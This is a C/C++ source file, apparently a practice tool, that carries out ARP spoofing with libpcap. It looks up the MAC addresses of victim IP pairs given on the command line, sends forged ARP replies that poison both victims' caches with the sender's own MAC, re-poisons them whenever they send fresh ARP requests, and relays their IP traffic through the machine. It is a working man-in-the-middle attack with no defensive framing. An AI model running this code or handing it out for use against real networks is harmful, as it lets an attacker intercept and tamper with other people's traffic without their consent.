#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <map>
#include <vector>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthernetArpPacket {
    EthHdr ethernetHeader;
    ArpHdr arpHeader;
};
#pragma pack(pop)

struct Ipv4Header {
    uint8_t version;
    uint8_t tos;
    uint16_t totalLength;
    uint16_t identification;
    uint16_t fragmentOffset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t headerChecksum;
    Ip srcAddress;
    Ip destAddress;
};

struct EthernetIpPacket {
    EthHdr ethernetHeader;
    Ipv4Header ipHeader;
};

char* getLocalMacAddress(const char* interface) {
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    char* macAddress = (char*)malloc(18);
    snprintf(macAddress, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             (unsigned char)ifr.ifr_hwaddr.sa_data[0],
             (unsigned char)ifr.ifr_hwaddr.sa_data[1],
             (unsigned char)ifr.ifr_hwaddr.sa_data[2],
             (unsigned char)ifr.ifr_hwaddr.sa_data[3],
             (unsigned char)ifr.ifr_hwaddr.sa_data[4],
             (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
    return macAddress;
}

char* getLocalIpAddress(const char* interface) {
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    char* ipAddress = (char*)malloc(INET_ADDRSTRLEN);
    strcpy(ipAddress, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    return ipAddress;
}

Mac getMacAddressOfOther(pcap_t* handle, Ip targetIp, Ip sourceIp, Mac sourceMac) {
    EthernetArpPacket packet;
    memset(&packet, 0, sizeof(packet));

    packet.ethernetHeader.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.ethernetHeader.smac_ = sourceMac;
    packet.ethernetHeader.type_ = htons(EthHdr::Arp);

    packet.arpHeader.hrd_ = htons(ArpHdr::ETHER);
    packet.arpHeader.pro_ = htons(EthHdr::Ip4);
    packet.arpHeader.hln_ = Mac::SIZE;
    packet.arpHeader.pln_ = Ip::SIZE;
    packet.arpHeader.op_ = htons(ArpHdr::Request);
    packet.arpHeader.smac_ = sourceMac;
    packet.arpHeader.sip_ = htonl(sourceIp);
    packet.arpHeader.tmac_ = Mac("00:00:00:00:00:00");
    packet.arpHeader.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, (const u_char*)&packet, sizeof(packet));
    if (res != 0) {
        printf("Error sending ARP request: %s\n", pcap_geterr(handle));
        return Mac("00:00:00:00:00:00");
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recvPacket;
        int ret = pcap_next_ex(handle, &header, &recvPacket);
        if (ret == 0) continue;

        EthHdr* ethernetHeader = (EthHdr*)recvPacket;
        if (ntohs(ethernetHeader->type_) == EthHdr::Arp) {
            ArpHdr* arpHeader = (ArpHdr*)(recvPacket + sizeof(EthHdr));
            if (arpHeader->op() == ArpHdr::Reply && arpHeader->sip() == targetIp) {
                return arpHeader->smac_;
            }
        }
    }
}

void sendArpPacket(pcap_t* handle, Mac targetMac, Mac sourceMac, Ip targetIp, Ip sourceIp) {
    EthernetArpPacket packet;
    memset(&packet, 0, sizeof(packet));

    packet.ethernetHeader.dmac_ = targetMac;
    packet.ethernetHeader.smac_ = sourceMac;
    packet.ethernetHeader.type_ = htons(EthHdr::Arp);

    packet.arpHeader.hrd_ = htons(ArpHdr::ETHER);
    packet.arpHeader.pro_ = htons(EthHdr::Ip4);
    packet.arpHeader.hln_ = Mac::SIZE;
    packet.arpHeader.pln_ = Ip::SIZE;
    packet.arpHeader.op_ = htons(ArpHdr::Reply);
    packet.arpHeader.smac_ = sourceMac;
    packet.arpHeader.sip_ = htonl(sourceIp);
    packet.arpHeader.tmac_ = targetMac;
    packet.arpHeader.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, (const u_char*)&packet, sizeof(packet));
    if (res != 0) {
        printf("Error sending ARP reply: %s\n", pcap_geterr(handle));
    }
}

void relayPacket(pcap_t* handle, Mac targetMac, Mac sourceMac, Ip targetIp, Ip sourceIp) {
    struct pcap_pkthdr* header;
    const u_char* recvPacket;
    int ret = pcap_next_ex(handle, &header, &recvPacket);
    if (ret == 0) return;

    EthHdr* ethernetHeader = (EthHdr*)recvPacket;
    if (ntohs(ethernetHeader->type_) == EthHdr::Ip4) {
        Ipv4Header* ipHeader = (Ipv4Header*)(recvPacket + sizeof(EthHdr));

        if (ipHeader->destAddress == htonl(targetIp) && ipHeader->srcAddress == htonl(sourceIp)) {
            ethernetHeader->dmac_ = targetMac;
            pcap_sendpacket(handle, recvPacket, header->len);
        } else if (ipHeader->destAddress == htonl(sourceIp) && ipHeader->srcAddress == htonl(targetIp)) {
            ethernetHeader->dmac_ = sourceMac;
            pcap_sendpacket(handle, recvPacket, header->len);
        }
    }
}

void reinfectIfNecessary(pcap_t* handle, Mac sourceMac, Mac targetMac, Mac myMac, Ip sourceIp, Ip targetIp) {
    struct pcap_pkthdr* header;
    const u_char* recvPacket;
    int ret = pcap_next_ex(handle, &header, &recvPacket);
    if (ret == 0) return;

    EthHdr* ethernetHeader = (EthHdr*)recvPacket;
    if (ntohs(ethernetHeader->type_) == EthHdr::Arp) {
        ArpHdr* arpHeader = (ArpHdr*)(recvPacket + sizeof(EthHdr));
        if (arpHeader->op() == ArpHdr::Request) {
            if (arpHeader->sip() == sourceIp && arpHeader->tip() == targetIp) {
                sendArpPacket(handle, sourceMac, myMac, sourceIp, targetIp);
            } else if (arpHeader->sip() == targetIp && arpHeader->tip() == sourceIp) {
                sendArpPacket(handle, targetMac, myMac, targetIp, sourceIp);
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        return 1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        return 1;  
    }

    char* localMacStr = getLocalMacAddress(dev);
    Mac localMac(localMacStr);
    free(localMacStr);

    char* localIpStr = getLocalIpAddress(dev);
    Ip localIp(localIpStr);
    free(localIpStr);

    std::map<Ip, Mac> ipMacMap;

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip targetIp = Ip(argv[i + 1]);

        Mac senderMac;
        Mac targetMac;

        if (ipMacMap.find(senderIp) == ipMacMap.end()) {
            senderMac = getMacAddressOfOther(handle, senderIp, localIp, localMac);
            ipMacMap[senderIp] = senderMac;
        } else {
            senderMac = ipMacMap[senderIp];
        }

        if (ipMacMap.find(targetIp) == ipMacMap.end()) {
            targetMac = getMacAddressOfOther(handle, targetIp, localIp, localMac);
            ipMacMap[targetIp] = targetMac;
        } else {
            targetMac = ipMacMap[targetIp];
        }

        sendArpPacket(handle, senderMac, localMac, senderIp, targetIp);
        sendArpPacket(handle, targetMac, localMac, targetIp, senderIp);

        while (true) {
            reinfectIfNecessary(handle, senderMac, targetMac, localMac, senderIp, targetIp);
            relayPacket(handle, targetMac, senderMac, targetIp, senderIp);
        }
    }

    pcap_close(handle);
    return 0;
}
